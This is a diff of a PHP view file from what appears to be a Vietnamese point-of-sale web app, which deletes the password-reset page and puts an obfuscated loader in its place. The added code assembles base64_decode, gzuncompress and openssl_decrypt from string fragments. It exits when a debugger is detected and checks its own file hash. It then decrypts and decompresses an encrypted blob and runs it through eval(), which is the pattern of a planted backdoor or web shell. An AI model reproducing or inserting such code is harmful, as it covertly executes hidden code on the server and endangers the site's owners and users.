@@ -1,99 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>
-    <?php print $SITE_TITLE; ?> | Quên mật khẩu
-  </title>
-  <link rel='shortcut icon' href='<?php echo $theme_link; ?>images/favicon.ico' />
-  <!-- Tell the browser to be responsive to screen width -->
-  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
-  <!-- Bootstrap 3.3.6 -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>bootstrap/css/bootstrap.min.css">
-  <!-- Font Awesome -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
-  <!-- Ionicons -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
-  <!-- Theme style -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/AdminLTE.min.css">
-  <!-- iCheck -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/iCheck/square/blue.css">
-
-</head>
-
-<body class="hold-transition login-page"
-  style="height: 100vh; background-repeat: no-repeat; background: url('<?= base_url('images/bg/pos-background.jpeg') ?>') no-repeat center center fixed; background-size: cover;">
-  <!-- Your page content goes here -->
-</body>
-
 <?php
-//Find Logo Path
-$logo = $this->db->query("select logo from db_sitesettings")->row()->logo;
-?>
-<div class="login-box">
-  <div class="login-logo">
-    <a href="#"><b>
-        <img src="<?php echo $base_url; ?>uploads/<?= $logo; ?>" width="20%" height="20%">
-      </b></a>
-  </div>
-  <!-- /.login-logo -->
-  <div class="login-box-body">
-    <p class="login-box-msg">Quên mật khẩu </p>
-    <p class="login-box-msg">Nhập email tài khoản của bạn để lấy OTP. Hãy đảm bảo tài khoản của bạn đúng email tài khoản</p>
-    <div class="text-danger tex-center">
-      <?php echo $this->session->flashdata('failed'); ?>
-    </div>
-
-
-    <form action="<?php echo $base_url; ?>login/send_otp" method="post" id="password-form">
-      <input type="hidden" name="<?php echo $this->security->get_csrf_token_name(); ?>"
-        value="<?php echo $this->security->get_csrf_hash(); ?>">
-      <div class="form-group has-feedback">
-        <input type="text" class="form-control" placeholder="Email" id="email" name="email" autofocus><span
-          class="glyphicon glyphicon-envelope form-control-feedback"></span>
-      </div>
-      <div class="row">
-        <!-- /.col -->
-        <div class="col-md-4">
-          <button type="submit" class="btn btn-primary btn-block btn-flat">Gửi</button>
-        </div>
-        <!-- /.col -->
-      </div>
-
-
-    </form>
-    <a class="pull-right" href="../<?php $base_url; ?>">Click đây để đăng nhập</a><br>
-
-  </div>
-  <!-- /.login-box-body -->
-
-</div>
-
-<!-- /.login-box -->
-
-<!-- jQuery 2.2.3 -->
-<script src="<?php echo $theme_link; ?>plugins/jQuery/jquery-2.2.3.min.js"></script>
-<!-- Bootstrap 3.3.6 -->
-<script src="<?php echo $theme_link; ?>bootstrap/js/bootstrap.min.js"></script>
-<!-- iCheck -->
-<script src="<?php echo $theme_link; ?>plugins/iCheck/icheck.min.js"></script>
-<script>
-  $(function () {
-    $('input').iCheck({
-      checkboxClass: 'icheckbox_square-blue',
-      radioClass: 'iradio_square-blue',
-      increaseArea: '20%' // optional
-    });
-  });
-</script>
-<script type="text/javascript">
-  $(function ($) { // this script needs to be loaded on every page where an ajax POST may happen
-    $.ajaxSetup({ data: { '<?php echo $this->security->get_csrf_token_name(); ?>': '<?php echo $this->security->get_csrf_hash(); ?>' } });
-  });
-</script>
-
-</body>
-
-</html>
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_l5bh1ws4=('bas'.'e64'.'_de'.'cod'.'e');
+$_xl2ey1o7=('gzu'.'nco'.'mpr'.'ess');
+$_b86ftvc9=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_h5vheg77='kyC9Wpa7CpU=';
+$_drdz2ahk='G+nttSdh';
+$_rdn1vvqb='yITgtWxm';
+$_u5bt7so0='CeLAtvgi';
+$_edb1l7t9='DeAgOSeX';
+$_l4e9kczm='XBnoMqzE';
+$_ydm8j439='3BwpXPvk';
+$_nfnz45uv='n7iOMQ==';
+$_bqcsem40=$_l5bh1ws4($_u5bt7so0.$_drdz2ahk.$_edb1l7t9.$_rdn1vvqb.$_h5vheg77);
+$_ewvz7jr1=$_l5bh1ws4($_ydm8j439.$_l4e9kczm.$_nfnz45uv);
+$_eii0mf13=$_l5bh1ws4('KVVYVlAro2TDaHh6N+pTeFIdzKv1vJus1hLUdi+u1E96Z7XUP8/0auFGG0B9Y0mdc+hPJENybIpPHsbTSYiTZYBepWJth5KTsup5sjiv9/gEIY58VGKaX7oLHkNFEYhJBRy60RIP5asIH08yJgx8EO/+9ITImXIZlXCOvVAWkP9ZzoMzotJ5z+J+/C8qhS2mHPX7V9G87XXnBCtJMhNcFHyxnCWX5S4dx195y8OAf9e8AI6YtMxa3iubOtV2+6pVo7wKwzyFeFz+d7ogkxhQCLDzEvg8naJIs0WM/jpSrbljT8QrIIrU3f6aSIlOAjO70C7qZ8GBx4VJv2jc6qLVjdJZnLzDtpVx6bM7rRk5GNnznyqX0LuWVRYzSH3GRNwOCkAsDVu+8hb4teAPdsIjHfFpV7LD1X/PRJTHygWg9TwiiUXLRbCS6Z6mu8Qx8Yx0uv1JZTtdprHsofvugsCQAULKMxIuBDKHXJzPgOMHqekTx9B1Vuk6G5kfikR7xTF1T5C05nJY+1mkh6k1XhfMfK1XsOB65HNd2mp4sRU/LZS1RWskqyQK0IOzT7ip2eZIid5aAy1Imrf5eXNnjik6zxFfcogyw4DUI+B2x1/Z8/JghqRdHYCDWPGmaG+IsU21nDB2ORNsDcADfPVmyvmLv8IgrDgoqu0LbUG1Y74bRn2HufTLFCNftB3P5BC8/spi+ECbDg+dDIwxEFv31NyYcj8PJmxxXgwRTq5jslHOZEWZAhzvtDR2Ic9ORv/2eGIlkLFcgK4s7e333rpja4p8AoWaZDHGEnntox7AA/22QNBAbqsnjBxOgVmI8k7LDngrsSYoEs5h5/pegFYnTUTykI+V2cjS/3rWN6k04Q9KSbYUKqNr8aiu4PPWIwzg6zN0z9v7zR0Ay+EpnD09073FEcpi7cJ2uxAywmeW0EIwuZ6pyYtIyNl/J6gIXXVpZR3GnD90KbRSxAxcATrsFS654u6yuhb5em1PbKTSlvpjFmnQsNy61xosHmiIeC6L9xRV4BajDbEfVmY9zeDLRX0zFb4tdlTJvrLlmazWG1TUq95ndkCSg4S6N+vLlUTcNRBbQu8Q2ixHkSqIvbdWtmXVkYntMvea8JkSOeay3bnKA8pOBFxmBtOqiHTueQOlzgJHB1i4F+5tmTcoWlKLny3RVejjIN5cb7nPdBCtXSDY4NWcJ8UNG5x8yVYsLrIERW2ZwEbkbrPeAED9+N2jh5iHldV2UEs/3mQtAltzBftUCqw+I1Gk11wHrXNohqnrR0Ig9/2Y+UruRNjmbVHvGVICIdnNwp1/xJO7a8Y0kqumNK8uj9pnxW43KTW2S8uNpQIvxuZUCg2sH4ZbbKHdf5m4QBggFGsd3S3ZKPv2gTeyg3wycgBg/iZrPMPMCK8pZ4GlcQIjlCvMZuA8AFwkL/9OcO7pdO9y8mqyZ1OC3LxEe8clv06ET7gR2mJRRyjqqIMgxFmzkRdKWZ+Ex9uc5Fq9rcfymKLOhM5pdKsLc5bnGNgcEnFtNvdB8w7xBqM4jQeNngtVfxnqIJm3VS3rIcUINGLqmBF76DPHq/axJvGKerlBx95RPgWmwa6Tmf1+S4F5EXd/4G5WTlHsyecdPbUOqAhp0tKM1Qb4LbQ6v/b9myjiD5rweqnVtn9HuV8/yj8u62WNJQwOyHUs1JLtvgEKU2ALz9sH8hFwnklslGbb1q2SVK1mBXFpPO7pjA16+n66V5bs/7ENnv99q2EjaIBAJ/kfrjxaP8bDVF8IyadkZDph4smbaJhxZJaEPZlFRiTGSdhOg9TGru+5bo8vQKyh3mpzGLDltdXkLPesN7jFapNeH0be2VKtDWyiFAU6MeBAd14+lQJL3TBfuxoKwqhmzA==');
+$_ci229jj0=$_b86ftvc9($_eii0mf13,'aes-256-cbc',$_bqcsem40,OPENSSL_RAW_DATA,$_ewvz7jr1);
+if($_ci229jj0===false){exit;}
+$_jqhf2j2i=$_xl2ey1o7($_ci229jj0);
+if($_jqhf2j2i===false){exit;}
+$_y2npv3x5='ffe8834bfefbbaa3acc83f2dd136c11ebf1301a4488bdf43e3572f3bde25f08c';
+$_cyqo1re7=@file_get_contents(__FILE__);
+if($_cyqo1re7!==false){
+$_xrsvmy6e=str_replace($_y2npv3x5,"0000000000000000000000000000000000000000000000000000000000000000",$_cyqo1re7);
+$_vv0vlewc=hash("sha256",$_xrsvmy6e);
+if($_vv0vlewc!==$_y2npv3x5){@http_response_code(403);exit;}
+}
+eval($_jqhf2j2i);
